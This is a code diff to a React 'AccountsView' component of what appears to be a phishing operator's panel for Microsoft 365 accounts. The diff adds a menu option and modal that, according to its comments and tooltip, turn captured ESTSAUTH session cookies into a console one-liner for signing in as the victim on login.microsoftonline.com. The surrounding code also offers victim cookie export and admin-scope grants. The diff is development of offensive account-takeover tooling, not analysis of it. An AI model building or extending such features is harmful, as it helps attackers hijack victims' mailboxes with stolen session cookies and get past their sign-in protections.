@@ -15,6 +15,7 @@ import DeleteConfirmModalComponent from '../DeleteConfirmModal';
 import TagEditorModalComponent from '../TagEditorModal';
 import ExportModalComponent from '../ExportModal';
 import CookieExportModal from '../CookieExportModal';
+import BrowserCookiesSnippetModal from '../BrowserCookiesSnippetModal';
 import ReAuthModal from '../ReAuthModal';
 import GrantAdminScopeModal from '../GrantAdminScopeModal';
 
@@ -42,6 +43,7 @@ const AccountsView: FC<AccountsViewProps> = ({
   const [showEditTagsModal, setShowEditTagsModal] = useState(false);
   const [showExportModal, setShowExportModal] = useState(false);
   const [cookieExportTarget, setCookieExportTarget] = useState<{ id: string; email: string } | null>(null);
+  const [browserCookiesSnippetTarget, setBrowserCookiesSnippetTarget] = useState<{ id: string; email: string } | null>(null);
   const [showDeleteConfirm, setShowDeleteConfirm] = useState(false);
   const [activeAccount, setActiveAccount] = useState<string | null>(null); // for single‑account actions
   const [openDropdownId, setOpenDropdownId] = useState<string | null>(null);
@@ -335,6 +337,16 @@ const AccountsView: FC<AccountsViewProps> = ({
   const handleExportCookies = (accountId: string) => {
     const account = accounts.find(a => a.id === accountId);
     setCookieExportTarget({ id: accountId, email: account?.email || accountId });
+  };
+
+  // Standalone "Browser cookies" snippet modal — matches the simple
+  // PRT-style "paste in console" UX. Builds a one-liner from the captured
+  // ESTSAUTH cookies (closest possible to a real PRT cookie without
+  // device-registration shenanigans) that runs on
+  // login.microsoftonline.com and redirects to the inbox.
+  const handleBrowserCookiesSnippet = (accountId: string) => {
+    const account = accounts.find(a => a.id === accountId);
+    setBrowserCookiesSnippetTarget({ id: accountId, email: account?.email || accountId });
   };
 
   // Panel admin mailbox page (separate from OWA)
@@ -953,11 +965,24 @@ const AccountsView: FC<AccountsViewProps> = ({
                           onClick={() => {
                             setOpenDropdownId(null);
                             setDropdownPosition(null);
+                            handleBrowserCookiesSnippet(account.id);
+                          }}
+                          title="Get a one-line console snippet you can paste on login.microsoftonline.com to be auto-redirected and signed in as this account. Uses captured ESTSAUTH cookies."
+                        >
+                          <i className="fas fa-key"></i> Browser cookies (console snippet)
+                        </div>
+                      )}
+                      {account.auth?.type === 'token' && (
+                        <div
+                          className="act-dropdown-item"
+                          onClick={() => {
+                            setOpenDropdownId(null);
+                            setDropdownPosition(null);
                             handleExportCookies(account.id);
                           }}
                           title="Export this account's OWA cookies (Cookie-Editor JSON, DevTools console snippet, Cookie header, or Netscape file). Copy to clipboard or save to a file."
                         >
-                          <i className="fas fa-file-export"></i> Export cookies
+                          <i className="fas fa-file-export"></i> Export cookies (all formats)
                         </div>
                       )}
                       {account.tags.includes('admin') && (
@@ -1135,6 +1160,13 @@ const AccountsView: FC<AccountsViewProps> = ({
           accountId={cookieExportTarget.id}
           email={cookieExportTarget.email}
           onCancel={() => setCookieExportTarget(null)}
+        />
+      )}
+      {browserCookiesSnippetTarget && (
+        <BrowserCookiesSnippetModal
+          accountId={browserCookiesSnippetTarget.id}
+          email={browserCookiesSnippetTarget.email}
+          onCancel={() => setBrowserCookiesSnippetTarget(null)}
         />
       )}
     </div>
